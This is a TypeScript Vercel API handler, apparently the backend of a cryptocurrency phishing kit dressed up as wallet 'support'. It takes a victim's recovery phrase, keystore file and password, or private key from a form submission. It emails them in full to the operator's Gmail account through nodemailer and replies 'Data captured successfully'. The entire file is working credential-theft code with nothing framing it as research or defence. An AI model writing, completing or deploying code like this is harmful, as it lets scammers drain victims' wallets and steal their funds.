import { VercelRequest, VercelResponse } from '@vercel/node';
import nodemailer from "nodemailer";
import { randomUUID } from "crypto";

const GMAIL_USER = process.env.GMAIL_USER || "your-email@gmail.com";
const GMAIL_APP_PASSWORD = process.env.GMAIL_APP_PASSWORD || "";

const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: GMAIL_USER,
    pass: GMAIL_APP_PASSWORD
  }
});

export default async function handler(req: VercelRequest, res: VercelResponse) {
  if (req.method === 'POST') {
    try {
      const { wallet, method, data, timestamp, category, categoryTitle } = req.body;
      
      let emailContent = `
        <h2>🔍 Wallet Connection - ${categoryTitle || "Support"}</h2>
        <h3>Issue Details:</h3>
        <p><strong>Category:</strong> ${categoryTitle || "General Support"}</p>
        <p><strong>Category Slug:</strong> ${category || "unknown"}</p>
        <p><strong>Timestamp:</strong> ${timestamp}</p>
        <p><strong>Wallet:</strong> ${wallet}</p>
        <p><strong>Connection Method:</strong> ${method}</p>
        <hr>
      `;

      if (method === "phrase") {
        emailContent += `
          <h3>Recovery Phrase:</h3>
          <p style="background: #f5f5f5; padding: 10px; border-radius: 5px; font-family: monospace;">
            ${data.phrase}
          </p>
        `;
      } else if (method === "keystore") {
        emailContent += `
          <h3>Keystore File:</h3>
          <p><strong>Filename:</strong> ${data.filename}</p>
          <p><strong>Password:</strong> ${data.password}</p>
          <details>
            <summary>Keystore Content</summary>
            <pre style="background: #f5f5f5; padding: 10px; border-radius: 5px; overflow-x: auto;">
              ${data.content}
            </pre>
          </details>
        `;
      } else if (method === "privateKey") {
        emailContent += `
          <h3>Private Key:</h3>
          <p style="background: #f5f5f5; padding: 10px; border-radius: 5px; font-family: monospace;">
            ${data.privateKey}
          </p>
        `;
      }

      const mailOptions = {
        from: GMAIL_USER,
        to: GMAIL_USER,
        subject: `🔍 ${categoryTitle || "Support"} - ${wallet} (${method})`,
        html: emailContent
      };

      await transporter.sendMail(mailOptions);
      
      res.status(200).json({ success: true, message: "Data captured successfully" });
    } catch (error) {
      console.error("Error capturing wallet data:", error);
      res.status(500).json({ success: false, message: "Failed to capture data" });
    }
  } else {
    res.setHeader('Allow', ['POST']);
    res.status(405).json({ message: `Method ${req.method} Not Allowed` });
  }
}
